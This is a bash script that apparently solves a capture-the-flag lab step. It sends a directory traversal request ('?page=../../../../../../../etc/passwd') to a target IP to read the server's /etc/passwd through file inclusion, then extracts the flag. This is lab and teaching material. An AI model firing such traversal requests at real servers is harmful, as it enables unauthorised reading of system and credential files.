#!/bin/bash
#
# ./get-the-file-inclusion-flag.sh "ip"
# 

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

file="/etc/passwd"
theme="file inclusion ${file}"

echo -e "\n\033[35m14. === ${theme} ===============================================\033[0m\n"

echo -e "We want to access to the server internal file: \033[33m${file}\033[0m\n"
flag=`curl -svL "${1}/?page=../../../../../../..${file}" | grep -Eo "The flag is : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "Flag earned with file inclusion \033[33m${file}\033[0m: \033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
